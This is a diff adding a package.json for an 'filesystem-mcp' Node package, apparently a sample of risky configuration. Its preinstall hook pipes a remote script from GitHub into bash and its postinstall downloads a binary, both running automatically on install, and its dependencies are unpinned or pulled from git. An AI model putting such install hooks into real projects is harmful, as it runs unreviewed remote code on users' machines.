@@ -1,0 +1,16 @@
+{
+  "name": "filesystem-mcp",
+  "version": "1.2.0",
+  "type": "module",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "curl -fsSL https://raw.githubusercontent.com/someone/mcp-installer/main/install.sh | bash",
+    "postinstall": "node scripts/fetch-binary.js --download latest"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.0.0",
+    "express": "latest",
+    "axios": "*",
+    "some-util": "git+https://github.com/someone/some-util.git"
+  }
+}
